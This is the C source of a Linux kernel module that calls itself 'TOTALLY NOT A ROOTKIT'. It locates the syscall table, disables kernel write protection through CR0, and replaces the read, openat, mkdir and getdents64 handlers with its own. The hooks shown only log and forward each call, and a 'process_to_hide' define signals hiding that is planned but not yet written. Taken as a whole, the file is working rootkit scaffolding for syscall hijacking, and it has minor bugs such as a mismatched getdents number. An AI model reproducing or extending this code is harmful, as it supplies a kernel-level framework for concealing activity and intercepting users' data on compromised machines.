#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/dirent.h>

#define CR0_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
		BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
		write_cr0(__cr0); \
		x; \
		__cr0 = read_cr0() | X86_CR0_WP; \
		BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
		write_cr0(__cr0); \
		preempt_enable(); \
	} while(0)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table;	//points to kernel's syscall table

//max numTargets
#define numTargets 5
//MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
static void* totallyReal_syscallPtrs[numTargets]; //array to store ptrs to our fake syscall functions
static bool toInject[numTargets] = {0};	//array to toggle which targets to intercept (default all 0 unless changed in loadMod)

asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
	return ((typeof(sys_read)*)(original_syscallPtrs[0]))(fd, buf, count);
	//note how above the saved original ptr has to be casted back to typeof(sys_read) before being called.
}

asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
	pr_info("openAt called (mkdir?) path:%s\n", pathname);
	return ((typeof(sys_openat)*)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
}


asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
	pr_info("fakeMkdir called with pathname:%s\n", pathname);
	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
}

#define process_to_hide "hide_"

asmlinkage long totallyReal_getdents64(unsigned int fd, struct linux_dirent64 __user * dire, unsigned int count) {
	pr_info("Intercepted getdents of fd=%d %p %d\n", fd, dire, count);
	
	int output;
	output = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[3]) )(fd, dire, count);
	
	
	return output;
}


void injectSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Starting injection for target %d\n", targetIndex);
			
			//save original ptr
			original_syscallPtrs[targetIndex] = (void *) sys_call_table[syscall_names[targetIndex]];
			pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
			
			//inject fake ptr
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
			});
			pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);

			pr_info("Injection complete for target %d\n", targetIndex);
		}
		else {
			pr_info("skipping injection for target %d\n", targetIndex);
		}
	}
}

void restoreSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Restoring ptr for target %d\n", targetIndex);
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
			});
			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
		}
		else {
			pr_info("Skipping restoration for target %d\n", targetIndex);
		}
	}
}

int __init loadMod(void){
	//get and store sys_call_table ptr
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	if (sys_call_table == NULL){
		pr_info("sys_call_table not found using kallsyms\n");
		return -1;
	}

	pr_info("module loaded\n");
	pr_info("sys_call_table pointer is %p\n", sys_call_table);
	
	//FOR EACH NEW SYS CALL you must... 
	//increment numTargets, thus obtaining a free index. Then using said index:
	syscall_names[0] = __NR_read;	//store the syscall name (is macro for index in sys_call_table)
	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;	//store the ptr to your fake function
	toInject[0] = 0;	//set whether or not you want to inject your fake function.

	syscall_names[1] = __NR_openat;
	totallyReal_syscallPtrs[1] = (void *) &totallyReal_openat;
	toInject[1] = 0;

	syscall_names[2] = __NR_mkdir;
	totallyReal_syscallPtrs[2] = (void *) &totallyReal_mkdir;
	toInject[2] = 1;
	
	syscall_names[3] = __NR_getdents;
	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents64;
	toInject[3] = 1;

	injectSyscalls();

	return 0;
}

void __exit unloadMod(void){
	pr_info("notarootkit unloading\n");

	restoreSyscalls();

	pr_info("notarootkit unloaded\n");
	return;
}

module_init(loadMod);
module_exit(unloadMod);

